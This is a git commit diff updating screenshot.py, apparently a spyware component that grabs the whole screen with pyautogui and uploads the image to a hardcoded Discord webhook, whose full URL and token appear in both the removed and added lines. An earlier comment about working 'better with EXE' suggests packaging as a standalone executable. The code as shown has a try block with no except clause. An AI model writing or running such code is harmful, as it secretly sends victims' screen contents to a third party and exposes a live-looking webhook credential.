ccf50046dd8dd92e2640af247c39dc165de14373
kaki869 <thexor7@gmail.com>
2025-11-02 04:06:55 +0000

    Update screenshot.py

--- screenshot.py
+++ screenshot.py
@@ -1,23 +1,20 @@
-from PIL import ImageGrab
+import pyautogui
 import requests
 import io
 import os
 
-def screenshot_pillow():
-    """Use PIL/Pillow which works better with EXE"""
+def screenshot_pyautogui():
     try:
-        screenshot = ImageGrab.grab()
+        screenshot = pyautogui.screenshot()
         
         img_bytes = io.BytesIO()
         screenshot.save(img_bytes, format='PNG')
         img_bytes.seek(0)
-
-        WEBHOOK_URL = "https://discord.com/api/webhooks/1428033334780629147/aVYrRB172coH38ajLXrj5vwlBftEppXC7mkfICZUjDGZIPjA_eZDtl70T_K6Mj4md8z8"
-
-        files = {'file': ('screenshot.png', img_bytes, 'image/png')}
-        response = requests.post(WEBHOOK_URL, files=files, data={'content': '📸'})
         
-        input("Press Enter...")
+        WEBHOOK_URL = "https://discord.com/api/webhooks/1428033334780629147/aVYrRB172coH38ajLXrj5vwlBftEppXC7mkfICZUjDGZIPjA_eZDtl70T_K6Mj4md8z8"
+        
+        files = {'file': ('screenshot.png', img_bytes, 'image/png')}
+        response = requests.post(WEBHOOK_URL, files=files, data={'content': '📸 Screenshot'})
 
 if __name__ == "__main__":
-    screenshot_pillow()
+    screenshot_pyautogui()
